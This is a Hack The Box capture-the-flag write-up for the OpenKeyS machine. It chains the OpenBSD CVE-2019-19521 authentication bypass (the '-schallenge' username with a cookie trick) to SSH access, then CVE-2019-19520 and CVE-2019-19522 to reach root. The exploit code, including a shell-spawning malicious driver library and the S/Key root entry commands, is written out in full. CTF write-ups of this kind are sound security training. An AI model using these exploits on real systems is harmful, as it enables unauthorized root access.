![](openkeys_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

||
|-----------|
|Start with the nmap found web server on port 80. Enumeration of the server using __GoBuster__ reveals a __Vim swap file__. This contains the code that the website uses for authentication, and was last edited by a user called __Jennifer__. Another file found from gobuster is  the `check_auth` binary which uses the OpenBSD authentication framework. This version of the authentication frameworkis found vulnerable for authentication bypass, and after successful exploitation the login page is bypassed. Due to insecure PHP coding, it is possible to set the username to Jennifer through the usage ofcookies, and acquire SSH credentials. Enumeration from jennifer's shell confirms that the __OS version__ in useto be __6.6__ which is vulnerable to a __privilege escalation exploit__.  Attackers can leverage the file/usr/X11R6/bin/xlock to become a member of the __auth group__, after which they can leveragethe __S/Key authentication__ option to add an entry for the root user and escalate their privileges.|

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.199 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.199`
```diff
PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
+80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|firewall
Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%)
```

* __OS :__ OpenBSD

## Web_server

### Gobuster
`gobuster dir -u 10.10.10.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`
```
/includes (Status: 301)
```

* 10.10.10.199 on port 80 has a login page

  __Title :__ OpenKeyS - Retrieve your OpenSSH Keys

* http://10.10.10.199/includes/

	  Index of /includes/

	  ../                                                23-Jun-2020 08:18                   -
	  auth.php                                           22-Jun-2020 13:24                1373
	  auth.php.swp                                       17-Jun-2020 14:57               12288

* Swap file created by the Vi text editor or one of its variants such as Vim (Vi iMproved) and gVim; stores the recovery version of a file that is being edited in the program; also serves as a lock file so that no other Vi editing session can concurrently write to the file.
* `strings` auth.php.swp get a __username: jennifer__

* __Recover `auth.php` file__

	`vim -r auth.php.swp`
	
  __Inside [auth.php](dump/auth.php) file__	

	  function authenticate($username, $password)
	  {
	      $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
	      system($cmd, $retcode);
	      return $retcode;
	  }

  * The PHP script makes use of `/auth_helpers/check_auth` to authenticate users.
  * try to get the file, which is an OpenBSD shared object. 

	    http://10.10.10.199/auth_helpers/check_auth

	    -rw-r--r-- 1 x00tex x00tex 12288 Oct 14 10:21 check_auth

* __[check_auth](dump/check_auth) file__

* file is not excuting in linux because it made form OpenBSD.
* i search for `OpenBSD check_auth` and found Authentication Bypass and Local Privilege Escalation Vulnerabilities.

# User Exploit

__Exploit :__ CVE-2019-19521 (Authentication Bypass)

__Report :__ [qualys.com](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt)

__Exploit surface:__ if an attacker specifies the username "-schallenge" (or "-schallenge:passwd" to force a passwd-style authentication), then the authentication is automatically successful and therefore bypassed.

* but still getting Authentication denied error
* i don't find the use of username that i found and when using `-schallenge` as username it gives an error 

	  OpenSSH key not found for user "-schallenge"
	  
* in [auth.php](dump/auth.php) script, there are some session variables defined that applicable in session cookie.

	  function init_session()
	  {
	      $_SESSION["logged_in"] = True;
	      $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
	      $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
	      $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
	      $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
	      $_SESSION["username"] = $_REQUEST['username'];
	  }

* there is also a `username` variable available,

	  $_SESSION["username"] = $_REQUEST['username'];

* send request with `username=jennifer`

	`curl -L http://10.10.10.199/index.php -d "username=-schallenge&password=password" -b "PHPSESSID=qqe08df89r71d7jb7i869857uh;username=jennifer"`

  __output__, get ssh_key for user jennifer
  
	  OpenSSH key for user jennifer
	  
	  -----BEGIN OPENSSH PRIVATE KEY-----
	  b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
	  ...
	  qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=
	  -----END OPENSSH PRIVATE KEY-----

## ssh

`chmod 600 ssh_key`

`ssh -i ssh_key jennifer@10.10.10.199`
```
openkeys$ whoami         
jennifer
openkeys$ cat user.txt
36ab2123************************
```

## Local Enumeration

```
openkeys$ uname -a
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
```

__OpenBSD version :__ 6.6

__Local Exploit :__ CVE-2019-19520: Local privilege escalation via xlock *from that same "qualys" report*

__vulnerability :__ On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is set-group-ID "auth", not set-user-ID; the following check is therefore incomplete and should use issetugid() instead, A local attacker can exploit this vulnerability and dlopen() their own driver to obtain the privileges of the group "auth".

__Local Exploit :__ CVE-2019-19522: Local privilege escalation via S/Key and YubiKey *from that same "qualys" report*

__vulnerability :__ If the S/Key or YubiKey authentication type is enabled, then a local attacker can exploit the privileges of the group "auth" to obtain the full privileges of the user "root"

* so there are two exploit to get root __First__ get into __"auth"__ group using CVE-2019-19520 and __then__ get __"root"__ using CVE-2019-19522

# Root Exploit

* I found a script that autometiclly done that work.

  [Script](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## Manual 

### CVE-2019-19520

__First__, create `swrast_dri.c` file - 
```
openkeys$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF
```

__Second__, compile it - 
```diff
openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

openkeys$ ls
swrast_dri.c  swrast_dri.so
```

__Third__, run - 
```diff
openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 56546
openkeys$ _XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root
openkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
openkeys$ id
+uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)
```

* Now we are in `auth` group.

### CVE-2019-19522

__First__, create root skey and chmod it - 
```
openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
openkeys$ chmod 0600 /etc/skey/root
```

__Second__, run - 
```
$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN
openkeys# whoami                                                                
root
```

__Root shell__
```
openkeys# whoami                                               
root
openkeys# root.txt
f3a553b1************************
```